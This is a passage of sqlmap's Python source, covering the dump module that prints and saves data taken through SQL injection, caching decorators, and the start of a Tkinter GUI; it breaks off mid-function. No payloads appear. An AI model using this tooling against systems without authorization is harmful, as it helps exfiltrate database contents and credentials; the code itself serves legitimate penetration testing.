lib.core.enums import DUMP_FORMAT\nfrom lib.core.exception import SqlmapGenericException\nfrom lib.core.exception import SqlmapSystemException\nfrom lib.core.exception import SqlmapValueException\nfrom lib.core.replication import Replication\nfrom lib.core.settings import DUMP_FILE_BUFFER_SIZE\nfrom lib.core.settings import HTML_DUMP_CSS_STYLE\nfrom lib.core.settings import IS_WIN\nfrom lib.core.settings import METADB_SUFFIX\nfrom lib.core.settings import MIN_BINARY_DISK_DUMP_SIZE\nfrom lib.core.settings import TRIM_STDOUT_DUMP_SIZE\nfrom lib.core.settings import UNICODE_ENCODING\nfrom lib.core.settings import UNSAFE_DUMP_FILEPATH_REPLACEMENT\nfrom lib.core.settings import VERSION_STRING\nfrom lib.core.settings import WINDOWS_RESERVED_NAMES\nfrom lib.utils.safe2bin import safechardecode\nfrom thirdparty import six\nfrom thirdparty.magic import magic\n\nclass Dump(object):\n    \"\"\"\n    This class defines methods used to parse and output the results\n    of SQL injection actions\n    \"\"\"\n\n    def __init__(self):\n        self._outputFile = None\n        self._outputFP = None\n        self._lock = threading.Lock()\n\n    def _write(self, data, newline=True, console=True, content_type=None):\n        text = \"%s%s\" % (data, \"\\n\" if newline else \" \")\n\n        if conf.api:\n            dataToStdout(data, contentType=content_type, status=CONTENT_STATUS.COMPLETE)\n\n        elif console:\n            dataToStdout(text)\n\n        if self._outputFP:\n            multiThreadMode = kb.multiThreadMode\n            if multiThreadMode:\n                self._lock.acquire()\n\n            try:\n                self._outputFP.write(text)\n            except IOError as ex:\n                errMsg = \"error occurred while writing to log file ('%s')\" % getSafeExString(ex)\n                raise SqlmapGenericException(errMsg)\n\n            if multiThreadMode:\n                self._lock.release()\n\n        kb.dataOutputFlag = True\n\n    def flush(self):\n        if self._outputFP:\n            try:\n                self._outputFP.flush()\n            except IOError:\n                pass\n\n    def setOutputFile(self):\n        if conf.noLogging:\n            self._outputFP = None\n            return\n\n        self._outputFile = os.path.join(conf.outputPath, \"log\")\n        try:\n            self._outputFP = openFile(self._outputFile, \"ab\" if not conf.flushSession else \"wb\")\n        except IOError as ex:\n            errMsg = \"error occurred while opening log file ('%s')\" % getSafeExString(ex)\n            raise SqlmapGenericException(errMsg)\n\n    def singleString(self, data, content_type=None):\n        self._write(data, content_type=content_type)\n\n    def string(self, header, data, content_type=None, sort=True):\n        if conf.api:\n            self._write(data, content_type=content_type)\n\n        if isListLike(data) and len(data) == 1:\n            data = unArrayizeValue(data)\n\n        if isListLike(data):\n            self.lister(header, data, content_type, sort)\n        elif data is not None:\n            _ = getUnicode(data)\n\n            if _.endswith(\"\\r\\n\"):\n                _ = _[:-2]\n\n            elif _.endswith(\"\\n\"):\n                _ = _[:-1]\n\n            if _.strip(' '):\n                _ = _.strip(' ')\n\n            if \"\\n\" in _:\n                self._write(\"%s:\\n---\\n%s\\n---\" % (header, _))\n            else:\n                self._write(\"%s: %s\" % (header, (\"'%s'\" % _) if isinstance(data, six.string_types) else _))\n\n    def lister(self, header, elements, content_type=None, sort=True):\n        if elements and sort:\n            try:\n                elements = set(elements)\n                elements = list(elements)\n                elements.sort(key=lambda _: _.lower() if hasattr(_, \"lower\") else _)\n            except:\n                pass\n\n        if conf.api:\n            self._write(elements, content_type=content_type)\n\n        if elements:\n            self._write(\"%s [%d]:\" % (header, len(elements)))\n\n        for element in elements:\n            if isinstance(element, six.string_types):\n                self._write(\"[*] %s\" % element)\n            elif isListLike(element):\n                self._write(\"[*] \" + \", \".join(getUnicode(e) for e in element))\n\n        if elements:\n            self._write(\"\")\n\n    def banner(self, data):\n        self.string(\"banner\", data, content_type=CONTENT_TYPE.BANNER)\n\n    def currentUser(self, data):\n        self.string(\"current user\", data, content_type=CONTENT_TYPE.CURRENT_USER)\n\n    def currentDb(self, data):\n        if Backend.getIdentifiedDbms() in (DBMS.ORACLE, DBMS.PGSQL, DBMS.HSQLDB, DBMS.H2, DBMS.MONETDB, DBMS.VERTICA, DBMS.CRATEDB, DBMS.CACHE, DBMS.FRONTBASE):\n            self.string(\"current database (equivalent to schema on %s)\" % Backend.getIdentifiedDbms(), data, content_type=CONTENT_TYPE.CURRENT_DB)\n        elif Backend.getIdentifiedDbms() in (DBMS.ALTIBASE, DBMS.DB2, DBMS.MIMERSQL, DBMS.MAXDB, DBMS.VIRTUOSO):\n            self.string(\"current database (equivalent to owner on %s)\" % Backend.getIdentifiedDbms(), data, content_type=CONTENT_TYPE.CURRENT_DB)\n        else:\n            self.string(\"current database\", data, content_type=CONTENT_TYPE.CURRENT_DB)\n\n    def hostname(self, data):\n        self.string(\"hostname\", data, content_type=CONTENT_TYPE.HOSTNAME)\n\n    def dba(self, data):\n        self.string(\"current user is DBA\", data, content_type=CONTENT_TYPE.IS_DBA)\n\n    def users(self, users):\n        self.lister(\"database management system users\", users, content_type=CONTENT_TYPE.USERS)\n\n    def statements(self, statements):\n        self.lister(\"SQL statements\", statements, content_type=CONTENT_TYPE.STATEMENTS)\n\n    def userSettings(self, header, userSettings, subHeader, content_type=None):\n        self._areAdmins = set()\n\n        if isinstance(userSettings, (tuple, list, set)):\n            self._areAdmins = userSettings[1]\n            userSettings = userSettings[0]\n\n        users = [_ for _ in userSettings.keys() if _ is not None]\n        users.sort(key=lambda _: _.lower() if hasattr(_, \"lower\") else _)\n\n        if conf.api:\n            self._write(userSettings, content_type=content_type)\n\n        if userSettings:\n            self._write(\"%s:\" % header)\n\n        for user in users:\n            settings = filterNone(userSettings[user])\n\n            if isNoneValue(settings):\n                stringSettings = \"\"\n            else:\n                stringSettings = \" [%d]:\" % len(settings)\n\n            if user in self._areAdmins:\n                self._write(\"[*] %s (administrator)%s\" % (user, stringSettings))\n            else:\n                self._write(\"[*] %s%s\" % (user, stringSettings))\n\n            if settings:\n                settings.sort()\n\n                for setting in settings:\n                    self._write(\"    %s: %s\" % (subHeader, setting))\n\n        if userSettings:\n            self.singleString(\"\")\n\n    def dbs(self, dbs):\n        self.lister(\"available databases\", dbs, content_type=CONTENT_TYPE.DBS)\n\n    def dbTables(self, dbTables):\n        if isinstance(dbTables, dict) and len(dbTables) > 0:\n            if conf.api:\n                self._write(dbTables, content_type=CONTENT_TYPE.TABLES)\n\n            maxlength = 0\n\n            for tables in dbTables.values():\n                for table in tables:\n                    if table and isListLike(table):\n                        table = table[0]\n\n                    maxlength = max(maxlength, getConsoleLength(unsafeSQLIdentificatorNaming(getUnicode(table))))\n\n            lines = \"-\" * (int(maxlength) + 2)\n\n            for db, tables in dbTables.items():\n                tables = sorted(filter(None, tables))\n\n                self._write(\"Database: %s\" % unsafeSQLIdentificatorNaming(db) if db and METADB_SUFFIX not in db else \"<current>\")\n\n                if len(tables) == 1:\n                    self._write(\"[1 table]\")\n                else:\n                    self._write(\"[%d tables]\" % len(tables))\n\n                self._write(\"+%s+\" % lines)\n\n                for table in tables:\n                    if table and isListLike(table):\n                        table = table[0]\n\n                    table = unsafeSQLIdentificatorNaming(table)\n                    blank = \" \" * (maxlength - getConsoleLength(getUnicode(table)))\n                    self._write(\"| %s%s |\" % (table, blank))\n\n                self._write(\"+%s+\\n\" % lines)\n        elif dbTables is None or len(dbTables) == 0:\n            self.singleString(\"No tables found\", content_type=CONTENT_TYPE.TABLES)\n        else:\n            self.string(\"tables\", dbTables, content_type=CONTENT_TYPE.TABLES)\n\n    def dbTableColumns(self, tableColumns, content_type=None):\n        if isinstance(tableColumns, dict) and len(tableColumns) > 0:\n            if conf.api:\n                self._write(tableColumns, content_type=content_type)\n\n            for db, tables in tableColumns.items():\n                if not db:\n                    db = \"All\"\n\n                for table, columns in tables.items():\n                    maxlength1 = 0\n                    maxlength2 = 0\n\n                    colType = None\n\n                    colList = list(columns.keys())\n                    colList.sort(key=lambda _: _.lower() if hasattr(_, \"lower\") else _)\n\n                    for column in colList:\n                        colType = columns[column]\n\n                        column = unsafeSQLIdentificatorNaming(column)\n                        maxlength1 = max(maxlength1, len(column or \"\"))\n                        maxlength2 = max(maxlength2, len(colType or \"\"))\n\n                    maxlength1 = max(maxlength1, len(\"COLUMN\"))\n                    lines1 = \"-\" * (maxlength1 + 2)\n\n                    if colType is not None:\n                        maxlength2 = max(maxlength2, len(\"TYPE\"))\n                        lines2 = \"-\" * (maxlength2 + 2)\n\n                    self._write(\"Database: %s\\nTable: %s\" % (unsafeSQLIdentificatorNaming(db) if db and METADB_SUFFIX not in db else \"<current>\", unsafeSQLIdentificatorNaming(table)))\n\n                    if len(columns) == 1:\n                        self._write(\"[1 column]\")\n                    else:\n                        self._write(\"[%d columns]\" % len(columns))\n\n                    if colType is not None:\n                        self._write(\"+%s+%s+\" % (lines1, lines2))\n                    else:\n                        self._write(\"+%s+\" % lines1)\n\n                    blank1 = \" \" * (maxlength1 - len(\"COLUMN\"))\n\n                    if colType is not None:\n                        blank2 = \" \" * (maxlength2 - len(\"TYPE\"))\n\n                    if colType is not None:\n                        self._write(\"| Column%s | Type%s |\" % (blank1, blank2))\n                        self._write(\"+%s+%s+\" % (lines1, lines2))\n                    else:\n                        self._write(\"| Column%s |\" % blank1)\n                        self._write(\"+%s+\" % lines1)\n\n                    for column in colList:\n                        colType = columns[column]\n\n                        column = unsafeSQLIdentificatorNaming(column)\n                        blank1 = \" \" * (maxlength1 - len(column))\n\n                        if colType is not None:\n                            blank2 = \" \" * (maxlength2 - len(colType))\n                            self._write(\"| %s%s | %s%s |\" % (column, blank1, colType, blank2))\n                        else:\n                            self._write(\"| %s%s |\" % (column, blank1))\n\n                    if colType is not None:\n                        self._write(\"+%s+%s+\\n\" % (lines1, lines2))\n                    else:\n                        self._write(\"+%s+\\n\" % lines1)\n\n    def dbTablesCount(self, dbTables):\n        if isinstance(dbTables, dict) and len(dbTables) > 0:\n            if conf.api:\n                self._write(dbTables, content_type=CONTENT_TYPE.COUNT)\n\n            maxlength1 = len(\"Table\")\n            maxlength2 = len(\"Entries\")\n\n            for ctables in dbTables.values():\n                for tables in ctables.values():\n                    for table in tables:\n                        maxlength1 = max(maxlength1, getConsoleLength(getUnicode(table)))\n\n            for db, counts in dbTables.items():\n                self._write(\"Database: %s\" % unsafeSQLIdentificatorNaming(db) if db and METADB_SUFFIX not in db else \"<current>\")\n\n                lines1 = \"-\" * (maxlength1 + 2)\n                blank1 = \" \" * (maxlength1 - len(\"Table\"))\n                lines2 = \"-\" * (maxlength2 + 2)\n                blank2 = \" \" * (maxlength2 - len(\"Entries\"))\n\n                self._write(\"+%s+%s+\" % (lines1, lines2))\n                self._write(\"| Table%s | Entries%s |\" % (blank1, blank2))\n                self._write(\"+%s+%s+\" % (lines1, lines2))\n\n                sortedCounts = list(counts.keys())\n                sortedCounts.sort(reverse=True)\n\n                for count in sortedCounts:\n                    tables = counts[count]\n\n                    if count is None:\n                        count = \"Unknown\"\n\n                    tables.sort(key=lambda _: _.lower() if hasattr(_, \"lower\") else _)\n\n                    for table in tables:\n                        blank1 = \" \" * (maxlength1 - getConsoleLength(getUnicode(table)))\n                        blank2 = \" \" * (maxlength2 - len(str(count)))\n                        self._write(\"| %s%s | %d%s |\" % (table, blank1, count, blank2))\n\n                self._write(\"+%s+%s+\\n\" % (lines1, lines2))\n        else:\n            logger.error(\"unable to retrieve the number of entries for any table\")\n\n    def dbTableValues(self, tableValues):\n        replication = None\n        rtable = None\n        dumpFP = None\n        appendToFile = False\n        warnFile = False\n\n        if tableValues is None:\n            return\n\n        db = tableValues[\"__infos__\"][\"db\"]\n        if not db:\n            db = \"All\"\n        table = tableValues[\"__infos__\"][\"table\"]\n\n        if conf.api:\n            self._write(tableValues, content_type=CONTENT_TYPE.DUMP_TABLE)\n\n        try:\n            dumpDbPath = os.path.join(conf.dumpPath, unsafeSQLIdentificatorNaming(db))\n        except UnicodeError:\n            try:\n                dumpDbPath = os.path.join(conf.dumpPath, normalizeUnicode(unsafeSQLIdentificatorNaming(db)))\n            except (UnicodeError, OSError):\n                tempDir = tempfile.mkdtemp(prefix=\"sqlmapdb\")\n                warnMsg = \"currently unable to use regular dump directory. \"\n                warnMsg += \"Using temporary directory '%s' instead\" % tempDir\n                logger.warning(warnMsg)\n\n                dumpDbPath = tempDir\n\n        if conf.dumpFormat == DUMP_FORMAT.SQLITE:\n            replication = Replication(os.path.join(conf.dumpPath, \"%s.sqlite3\" % unsafeSQLIdentificatorNaming(db)))\n        elif conf.dumpFormat in (DUMP_FORMAT.CSV, DUMP_FORMAT.HTML):\n            if not os.path.isdir(dumpDbPath):\n                try:\n                    os.makedirs(dumpDbPath)\n                except:\n                    warnFile = True\n\n                    _ = re.sub(r\"[^\\w]\", UNSAFE_DUMP_FILEPATH_REPLACEMENT, unsafeSQLIdentificatorNaming(db))\n                    dumpDbPath = os.path.join(conf.dumpPath, \"%s-%s\" % (_, hashlib.md5(getBytes(db)).hexdigest()[:8]))\n\n                    if not os.path.isdir(dumpDbPath):\n                        try:\n                            os.makedirs(dumpDbPath)\n                        except Exception as ex:\n                            tempDir = tempfile.mkdtemp(prefix=\"sqlmapdb\")\n                            warnMsg = \"unable to create dump directory \"\n                            warnMsg += \"'%s' (%s). \" % (dumpDbPath, getSafeExString(ex))\n                            warnMsg += \"Using temporary directory '%s' instead\" % tempDir\n                            logger.warning(warnMsg)\n\n                            dumpDbPath = tempDir\n\n            dumpFileName = conf.dumpFile or os.path.join(dumpDbPath, re.sub(r'[\\\\/]', UNSAFE_DUMP_FILEPATH_REPLACEMENT, \"%s.%s\" % (unsafeSQLIdentificatorNaming(table), conf.dumpFormat.lower())))\n            if not checkFile(dumpFileName, False):\n                try:\n                    openFile(dumpFileName, \"w+b\").close()\n                except SqlmapSystemException:\n                    raise\n                except:\n                    warnFile = True\n\n                    _ = re.sub(r\"[^\\w]\", UNSAFE_DUMP_FILEPATH_REPLACEMENT, normalizeUnicode(unsafeSQLIdentificatorNaming(table)))\n                    if len(_) < len(table) or IS_WIN and table.upper() in WINDOWS_RESERVED_NAMES:\n                        _ = re.sub(r\"[^\\w]\", UNSAFE_DUMP_FILEPATH_REPLACEMENT, unsafeSQLIdentificatorNaming(table))\n                        dumpFileName = os.path.join(dumpDbPath, \"%s-%s.%s\" % (_, hashlib.md5(getBytes(table)).hexdigest()[:8], conf.dumpFormat.lower()))\n                    else:\n                        dumpFileName = os.path.join(dumpDbPath, \"%s.%s\" % (_, conf.dumpFormat.lower()))\n            else:\n                appendToFile = any((conf.limitStart, conf.limitStop))\n\n                if not appendToFile:\n                    count = 1\n                    while True:\n                        candidate = \"%s.%d\" % (dumpFileName, count)\n                        if not checkFile(candidate, False):\n                            try:\n                                shutil.copyfile(dumpFileName, candidate)\n                            except IOError:\n                                pass\n                            break\n                        else:\n                            count += 1\n\n            dumpFP = openFile(dumpFileName, \"wb\" if not appendToFile else \"ab\", buffering=DUMP_FILE_BUFFER_SIZE)\n\n        count = int(tableValues[\"__infos__\"][\"count\"])\n        separator = str()\n        field = 1\n        fields = len(tableValues) - 1\n\n        columns = prioritySortColumns(list(tableValues.keys()))\n\n        if conf.col:\n            cols = conf.col.split(',')\n            columns = sorted(columns, key=lambda _: cols.index(_) if _ in cols else 0)\n\n        for column in columns:\n            if column != \"__infos__\":\n                info = tableValues[column]\n                lines = \"-\" * (int(info[\"length\"]) + 2)\n                separator += \"+%s\" % lines\n\n        separator += \"+\"\n        self._write(\"Database: %s\\nTable: %s\" % (unsafeSQLIdentificatorNaming(db) if db and METADB_SUFFIX not in db else \"<current>\", unsafeSQLIdentificatorNaming(table)))\n\n        if conf.dumpFormat == DUMP_FORMAT.SQLITE:\n            cols = []\n\n            for column in columns:\n                if column != \"__infos__\":\n                    colType = Replication.INTEGER\n\n                    for value in tableValues[column]['values']:\n                        try:\n                            if not value or value == \" \":  # NULL\n                                continue\n\n                            int(value)\n                        except ValueError:\n                            colType = None\n                            break\n\n                    if colType is None:\n                        colType = Replication.REAL\n\n                        for value in tableValues[column]['values']:\n                            try:\n                                if not value or value == \" \":  # NULL\n                                    continue\n\n                                float(value)\n                            except ValueError:\n                                colType = None\n                                break\n\n                    cols.append((unsafeSQLIdentificatorNaming(column), colType if colType else Replication.TEXT))\n\n            rtable = replication.createTable(table, cols)\n        elif conf.dumpFormat == DUMP_FORMAT.HTML:\n            dataToDumpFile(dumpFP, \"<!DOCTYPE html>\\n<html>\\n<head>\\n\")\n            dataToDumpFile(dumpFP, \"<meta http-equiv=\\\"Content-type\\\" content=\\\"text/html;charset=%s\\\">\\n\" % UNICODE_ENCODING)\n            dataToDumpFile(dumpFP, \"<meta name=\\\"generator\\\" content=\\\"%s\\\" />\\n\" % VERSION_STRING)\n            dataToDumpFile(dumpFP, \"<title>%s</title>\\n\" % (\"%s%s\" % (\"%s.\" % db if METADB_SUFFIX not in db else \"\", table)))\n            dataToDumpFile(dumpFP, HTML_DUMP_CSS_STYLE)\n            dataToDumpFile(dumpFP, \"\\n</head>\\n<body>\\n<table>\\n<thead>\\n<tr>\\n\")\n\n        if count == 1:\n            self._write(\"[1 entry]\")\n        else:\n            self._write(\"[%d entries]\" % count)\n\n        self._write(separator)\n\n        for column in columns:\n            if column != \"__infos__\":\n                info = tableValues[column]\n\n                column = unsafeSQLIdentificatorNaming(column)\n                maxlength = int(info[\"length\"])\n                blank = \" \" * (maxlength - getConsoleLength(column))\n\n                self._write(\"| %s%s\" % (column, blank), newline=False)\n\n                if not appendToFile:\n                    if conf.dumpFormat == DUMP_FORMAT.CSV:\n                        if field == fields:\n                            dataToDumpFile(dumpFP, \"%s\" % safeCSValue(column))\n                        else:\n                            dataToDumpFile(dumpFP, \"%s%s\" % (safeCSValue(column), conf.csvDel))\n                    elif conf.dumpFormat == DUMP_FORMAT.HTML:\n                        dataToDumpFile(dumpFP, \"<th>%s</th>\" % getUnicode(htmlEscape(column).encode(\"ascii\", \"xmlcharrefreplace\")))\n\n                field += 1\n\n        if conf.dumpFormat == DUMP_FORMAT.HTML:\n            dataToDumpFile(dumpFP, \"\\n</tr>\\n</thead>\\n<tbody>\\n\")\n\n        self._write(\"|\\n%s\" % separator)\n\n        if conf.dumpFormat == DUMP_FORMAT.CSV:\n            dataToDumpFile(dumpFP, \"\\n\" if not appendToFile else \"\")\n\n        elif conf.dumpFormat == DUMP_FORMAT.SQLITE:\n            rtable.beginTransaction()\n\n        if count > TRIM_STDOUT_DUMP_SIZE:\n            warnMsg = \"console output will be trimmed to \"\n            warnMsg += \"last %d rows due to \" % TRIM_STDOUT_DUMP_SIZE\n            warnMsg += \"large table size\"\n            logger.warning(warnMsg)\n\n        for i in xrange(count):\n            console = (i >= count - TRIM_STDOUT_DUMP_SIZE)\n            field = 1\n            values = []\n\n            if conf.dumpFormat == DUMP_FORMAT.HTML:\n                dataToDumpFile(dumpFP, \"<tr>\")\n\n            for column in columns:\n                if column != \"__infos__\":\n                    info = tableValues[column]\n\n                    if len(info[\"values\"]) <= i:\n                        continue\n\n                    if info[\"values\"][i] is None:\n                        value = u''\n                    else:\n                        value = getUnicode(info[\"values\"][i])\n                        value = DUMP_REPLACEMENTS.get(value, value)\n\n                    values.append(value)\n                    maxlength = int(info[\"length\"])\n                    blank = \" \" * (maxlength - getConsoleLength(value))\n                    self._write(\"| %s%s\" % (value, blank), newline=False, console=console)\n\n                    if len(value) > MIN_BINARY_DISK_DUMP_SIZE and r'\\x' in value:\n                        try:\n                            mimetype = getText(magic.from_buffer(value, mime=True))\n                            if any(mimetype.startswith(_) for _ in (\"application\", \"image\")):\n                                if not os.path.isdir(dumpDbPath):\n                                    os.makedirs(dumpDbPath)\n\n                                _ = re.sub(r\"[^\\w]\", UNSAFE_DUMP_FILEPATH_REPLACEMENT, normalizeUnicode(unsafeSQLIdentificatorNaming(column)))\n                                filepath = os.path.join(dumpDbPath, \"%s-%d.bin\" % (_, randomInt(8)))\n                                warnMsg = \"writing binary ('%s') content to file '%s' \" % (mimetype, filepath)\n                                logger.warning(warnMsg)\n\n                                with openFile(filepath, \"w+b\", None) as f:\n                                    _ = safechardecode(value, True)\n                                    f.write(_)\n\n                        except Exception as ex:\n                            logger.debug(getSafeExString(ex))\n\n                    if conf.dumpFormat == DUMP_FORMAT.CSV:\n                        if field == fields:\n                            dataToDumpFile(dumpFP, \"%s\" % safeCSValue(value))\n                        else:\n                            dataToDumpFile(dumpFP, \"%s%s\" % (safeCSValue(value), conf.csvDel))\n                    elif conf.dumpFormat == DUMP_FORMAT.HTML:\n                        dataToDumpFile(dumpFP, \"<td>%s</td>\" % getUnicode(htmlEscape(value).encode(\"ascii\", \"xmlcharrefreplace\")))\n\n                    field += 1\n\n            if conf.dumpFormat == DUMP_FORMAT.SQLITE:\n                try:\n                    rtable.insert(values)\n                except SqlmapValueException:\n                    pass\n            elif conf.dumpFormat == DUMP_FORMAT.CSV:\n                dataToDumpFile(dumpFP, \"\\n\")\n            elif conf.dumpFormat == DUMP_FORMAT.HTML:\n                dataToDumpFile(dumpFP, \"</tr>\\n\")\n\n            self._write(\"|\", console=console)\n\n        self._write(\"%s\\n\" % separator)\n\n        if conf.dumpFormat == DUMP_FORMAT.SQLITE:\n            rtable.endTransaction()\n            logger.info(\"table '%s.%s' dumped to SQLITE database '%s'\" % (db, table, replication.dbpath))\n\n        elif conf.dumpFormat in (DUMP_FORMAT.CSV, DUMP_FORMAT.HTML):\n            if conf.dumpFormat == DUMP_FORMAT.HTML:\n                dataToDumpFile(dumpFP, \"</tbody>\\n</table>\\n</body>\\n</html>\")\n            else:\n                dataToDumpFile(dumpFP, \"\\n\")\n            dumpFP.close()\n\n            msg = \"table '%s.%s' dumped to %s file '%s'\" % (db, table, conf.dumpFormat, dumpFileName)\n            if not warnFile:\n                logger.info(msg)\n            else:\n                logger.warning(msg)\n\n    def dbColumns(self, dbColumnsDict, colConsider, dbs):\n        if conf.api:\n            self._write(dbColumnsDict, content_type=CONTENT_TYPE.COLUMNS)\n\n        for column in dbColumnsDict.keys():\n            if colConsider == \"1\":\n                colConsiderStr = \"s LIKE '%s' were\" % unsafeSQLIdentificatorNaming(column)\n            else:\n                colConsiderStr = \" '%s' was\" % unsafeSQLIdentificatorNaming(column)\n\n            found = {}\n            for db, tblData in dbs.items():\n                for tbl, colData in tblData.items():\n                    for col, dataType in colData.items():\n                        if column.lower() in col.lower():\n                            if db in found:\n                                if tbl in found[db]:\n                                    found[db][tbl][col] = dataType\n                                else:\n                                    found[db][tbl] = {col: dataType}\n                            else:\n                                found[db] = {}\n                                found[db][tbl] = {col: dataType}\n\n                            continue\n\n            if found:\n                msg = \"column%s found in the \" % colConsiderStr\n                msg += \"following databases:\"\n                self._write(msg)\n\n                self.dbTableColumns(found)\n\n    def sqlQuery(self, query, queryRes):\n        self.string(query, queryRes, content_type=CONTENT_TYPE.SQL_QUERY)\n\n    def rFile(self, fileData):\n        self.lister(\"files saved to\", fileData, sort=False, content_type=CONTENT_TYPE.FILE_READ)\n\n    def registerValue(self, registerData):\n        self.string(\"Registry key value data\", registerData, content_type=CONTENT_TYPE.REG_READ, sort=False)\n\n# object to manage how to print the retrieved queries output to\n# standard output and sessions file\ndumper = Dump()\n", "lib/core/decorators.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport functools\nimport hashlib\nimport threading\n\nfrom lib.core.datatype import LRUDict\nfrom lib.core.settings import MAX_CACHE_ITEMS\nfrom lib.core.settings import UNICODE_ENCODING\nfrom lib.core.threads import getCurrentThreadData\n\n_cache = {}\n_cache_lock = threading.Lock()\n_method_locks = {}\n\ndef cachedmethod(f):\n    \"\"\"\n    Method with a cached content\n\n    >>> __ = cachedmethod(lambda _: _)\n    >>> __(1)\n    1\n    >>> __(1)\n    1\n    >>> __ = cachedmethod(lambda *args, **kwargs: args[0])\n    >>> __(2)\n    2\n    >>> __ = cachedmethod(lambda *args, **kwargs: next(iter(kwargs.values())))\n    >>> __(foobar=3)\n    3\n\n    Reference: http://code.activestate.com/recipes/325205-cache-decorator-in-python-24/\n    \"\"\"\n\n    _cache[f] = LRUDict(capacity=MAX_CACHE_ITEMS)\n\n    @functools.wraps(f)\n    def _f(*args, **kwargs):\n        try:\n            key = int(hashlib.md5(\"|\".join(str(_) for _ in (f, args, kwargs)).encode(UNICODE_ENCODING)).hexdigest(), 16) & 0x7fffffffffffffff\n        except ValueError:  # https://github.com/sqlmapproject/sqlmap/issues/4281 (NOTE: non-standard Python behavior where hexdigest returns binary value)\n            result = f(*args, **kwargs)\n        else:\n            try:\n                with _cache_lock:\n                    result = _cache[f][key]\n            except KeyError:\n                result = f(*args, **kwargs)\n\n                with _cache_lock:\n                    _cache[f][key] = result\n\n        return result\n\n    return _f\n\ndef stackedmethod(f):\n    \"\"\"\n    Method using pushValue/popValue functions (fallback function for stack realignment)\n\n    >>> threadData = getCurrentThreadData()\n    >>> original = len(threadData.valueStack)\n    >>> __ = stackedmethod(lambda _: threadData.valueStack.append(_))\n    >>> __(1)\n    >>> len(threadData.valueStack) == original\n    True\n    \"\"\"\n\n    @functools.wraps(f)\n    def _(*args, **kwargs):\n        threadData = getCurrentThreadData()\n        originalLevel = len(threadData.valueStack)\n\n        try:\n            result = f(*args, **kwargs)\n        finally:\n            if len(threadData.valueStack) > originalLevel:\n                threadData.valueStack = threadData.valueStack[:originalLevel]\n\n        return result\n\n    return _\n\ndef lockedmethod(f):\n    @functools.wraps(f)\n    def _(*args, **kwargs):\n        if f not in _method_locks:\n            _method_locks[f] = threading.RLock()\n\n        with _method_locks[f]:\n            result = f(*args, **kwargs)\n\n        return result\n\n    return _\n", "lib/core/gui.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport os\nimport re\nimport socket\nimport subprocess\nimport sys\nimport tempfile\nimport threading\nimport webbrowser\n\nfrom lib.core.common import getSafeExString\nfrom lib.core.common import saveConfig\nfrom lib.core.data import paths\nfrom lib.core.defaults import defaults\nfrom lib.core.enums import MKSTEMP_PREFIX\nfrom lib.core.exception import SqlmapMissingDependence\nfrom lib.core.exception import SqlmapSystemException\nfrom lib.core.settings import DEV_EMAIL_ADDRESS\nfrom lib.core.settings import IS_WIN\nfrom lib.core.settings import ISSUES_PAGE\nfrom lib.core.settings import GIT_PAGE\nfrom lib.core.settings import SITE\nfrom lib.core.settings import VERSION_STRING\nfrom lib.core.settings import WIKI_PAGE\nfrom thirdparty.six.moves import queue as _queue\n\nalive = None\nline = \"\"\nprocess = None\nqueue = None\n\ndef runGui(parser):\n    try:\n        from thirdparty.six.moves import tkinter as _tkinter\n        from thirdparty.six.moves import tkinter_scrolledtext as _tkinter_scrolledtext\n        from thirdparty.six.moves import tkinter_ttk as _tkinter_ttk\n        from thirdparty.six.moves import tkinter_messagebox as _tkinter_messagebox\n    except ImportError as ex:\n        raise SqlmapMissingDependence(\"missing dependence ('%s')\" % getSafeExString(ex))\n\n    # Reference: https://www.reddit.com/r/learnpython/comments/985umy/limit_user_input_to_only_int_with_tkinter/e4dj9k9?utm_source=share&utm_medium=web2x\n    class ConstrainedEntry(_tkinter.Entry):\n        def __init__(self, master=None, **kwargs):\n            self.var = _tkinter.StringVar()\n            self.regex = kwargs[\"regex\"]\n            del kwargs[\"regex\"]\n            _tkinter.Entry.__init__(self, master, textvariable=self.var, **kwargs)\n            self.old_value = ''\n            self.var.trace('w', self.check)\n            self.get, self.set = self.var.get, self.var.set\n\n        def check(self, *args):\n            if re.search(self.regex, self.get()):\n                self.old_value = self.get()\n            else:\n                self.set(self.old_value)\n\n    # Reference: https://code.activestate.com/recipes/580726-tkinter-notebook-that-fits-to-the-height-of-every-/\n    class AutoresizableNotebook(_tkinter_ttk.Notebook):\n        def __init__(self, master=None, **kw):\n            _tkinter_ttk.Notebook.__init__(self, master, **kw)\n            self.bind(\"<<NotebookTabChanged>>\", self._on_tab_changed)\n\n        def _on_tab_changed(self, event):\n            event.widget.update_idletasks()\n\n            tab = event.widget.nametowidget(event.widget.select())\n            event.widget.configure(height=tab.winfo_reqheight())\n\n    try:\n        window = _tkinter.Tk()\n    except Exception as ex:\n        errMsg = \"unable to create GUI window ('%s')\" % getSafeExString(ex)\n        raise SqlmapSystemException(errMsg)\n\n    window.title(VERSION_STRING)\n\n    # Reference: https://www.holadevs.com/pregunta/64750/change-selected-tab-color-in-ttknotebook\n    style = _tkinter_ttk.Style()\n    settings = {\"TNotebook.Tab\": {\"configure\": {\"padding\": [5, 1], \"background\": \"#fdd57e\"}, \"map\": {\"background\": [(\"selected\", \"#C70039\"), (\"active\", \"#fc9292\")], \"foreground\": [(\"selected\", \"#ffffff\"), (\"active\", \"#000000\")]}}}\n    style.theme_create(\"custom\", parent=\"alt\", settings=settings)\n    style.theme_use(\"custom\")\n\n    # Reference: https://stackoverflow.com/a/10018670\n    def center(window):\n        window.update_idletasks()\n        width = window.winfo_width()\n        frm_width = window.winfo_rootx() - window.winfo_x()\n        win_width = width + 2 * frm_width\n        height = window.winfo_height()\n        titlebar_height = window.winfo_rooty() - window.winfo_y()\n        win_height = height + titlebar_height + frm_width\n        x = window.winfo_screenwidth() // 2 - win_width // 2\n        y = window.winfo_screenheight() // 2 - win_height // 2\n        window.geometry('{}x{}+{}+{}'.format(width, height, x, y))\n        window.deiconify()\n\n    def onKeyPress(event):\n        global line\n        global queue\n\n        if process:\n            if event.char == '\\b':\n                line = line[:-1]\n            else:\n                line += event.char\n\n    def onReturnPress(event):\n        global line\n        global queue\n\n        if process:\n            try:\n                process.stdin.write((\"%s\\n\" % line.strip()).encode())\n                process.stdin.flush()\n            except socket.error:\n                line = \"\"\n                event.widget.master.master.destroy()\n                return \"break\"\n            except:\n                return\n\n            event.widget.insert(_tkinter.END, 